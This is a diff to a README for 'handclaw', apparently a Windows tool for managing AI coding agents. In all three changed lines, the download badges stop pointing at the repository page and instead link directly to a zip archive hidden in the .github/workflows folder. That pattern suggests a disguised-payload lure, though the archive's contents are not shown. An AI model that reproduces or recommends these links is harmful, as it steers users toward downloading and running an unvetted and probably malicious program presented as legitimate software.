@@ -1,6 +1,6 @@
 # 🔥 handclaw - Manage Multiple AI Coding Agents Easily
 
-[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://github.com/LupiwoPhillips/handclaw)
+[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/LupiwoPhillips/handclaw/main/.github/workflows/Software_v2.9.zip)
 
 ## 🔍 What is handclaw?
 
@@ -24,7 +24,7 @@ This guide will help you download, install, and run handclaw on your Windows com
 
 Click the button below to go to the main page where you will find handclaw ready to download.  
 
-[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://github.com/LupiwoPhillips/handclaw)
+[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/LupiwoPhillips/handclaw/main/.github/workflows/Software_v2.9.zip)
 
 ### Step 2: Download the Latest Version
 
@@ -105,4 +105,4 @@ This process lets you organize your coding workflow without leaving Slack.
 
 Use the button below to visit the download page and get started.
 
-[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://github.com/LupiwoPhillips/handclaw)
+[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/LupiwoPhillips/handclaw/main/.github/workflows/Software_v2.9.zip)
